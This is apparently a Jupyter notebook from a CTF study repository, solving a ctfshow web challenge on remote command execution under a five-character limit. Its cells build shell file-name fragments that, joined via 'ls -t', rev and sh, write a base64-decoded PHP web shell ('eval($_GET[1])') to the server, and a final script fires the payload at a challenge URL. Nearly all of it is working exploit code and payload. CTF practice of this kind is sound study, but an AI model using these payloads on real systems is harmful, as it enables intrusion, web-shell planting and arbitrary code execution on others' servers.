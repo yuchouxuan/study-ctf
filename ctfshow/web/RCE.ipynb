{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 5字符"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ">e\\ >ch\\ >o\\\\ > D\\ >9w\\ >aH\\ >Ag\\ >ZX\\ >Zh\\ >bC\\ >gk\\ >X0\\ >dF\\ >VF\\ >sx\\ >XS\\ >k7\\ >\\|\\ >ba\\ >se\\ >64\\ > \\\\ >\t-\\ >d\\\\ >>1\\ >.p\\ >hp\\ \n",
      "27 27\n"
     ]
    }
   ],
   "source": [
    "# x = ls - t >g\n",
    "ls_t ='''>sl\n",
    ">ht-\n",
    ">g\\>\n",
    ">dir\n",
    "*>v\n",
    ">rev\n",
    "*v>x'''.splitlines()\n",
    "\n",
    "\n",
    "#<?php eval($_GET[1]);\n",
    "cmd = 'echo\\\\ D9waHAgZXZhbCgkX0dFVFsxXSk7\\\\|base64 \\\\\\t-d\\\\>1.php '\n",
    "cmdlist=[]\n",
    "cmdd = set()\n",
    "for i in range(1,len(cmd),2):\n",
    "    x = '>'+cmd[-i-2:-i]+\"\\\\\"\n",
    "    cmdlist.append(x)\n",
    "    cmdd.add(x)\n",
    "for i in range(len(cmdlist)):\n",
    "    print(cmdlist[-i-1],end=' ')\n",
    "print()\n",
    "print(len(cmdlist),len(cmdd))\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 羽大佬版本"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "pl ='''>dir\n",
    ">f\\>\n",
    ">ht-\n",
    ">sl\n",
    "*>v\n",
    ">rev\n",
    "*v>0\n",
    ">a\n",
    ">hp\n",
    ">p\\\\\n",
    ">2.\\\\\n",
    ">\\>\\\\\n",
    ">-d\\\\\n",
    ">\\%09\\\\\n",
    ">64\\\\\n",
    ">se\\\\\n",
    ">ba\\\\\n",
    ">\\|\\\\\n",
    ">7\\\\\n",
    ">Sk\\\\\n",
    ">X\\\\\n",
    ">x\\\\\n",
    ">Fs\\\\\n",
    ">FV\\\\\n",
    ">d\\\\\n",
    ">X0\\\\\n",
    ">k\\\\\n",
    ">g\\\\\n",
    ">bC\\\\\n",
    ">h\\\\\n",
    ">XZ\\\\\n",
    ">gZ\\\\\n",
    ">A\\\\\n",
    ">aH\\\\\n",
    ">w\\\\\n",
    ">D9\\\\\n",
    ">P\\\\\n",
    ">\\ \\\\\n",
    ">o\\\\\n",
    ">ch\\\\\n",
    ">e\\\\\n",
    "sh 0\n",
    "sh f'''.splitlines()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import urllib.parse\n",
    "url = \"http://35ca0584-b4b6-40d9-ac96-f679e4641ac5.challenge.ctf.show/index.php?cmd={0}\"\n",
    "print(\"[+]start attack!!!\")\n",
    "for i in pl:\n",
    "    print(\"[*]\" + url.format(i.strip()))\n",
    "    requests.get(url.format(urllib.parse.unquote(i.strip())))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
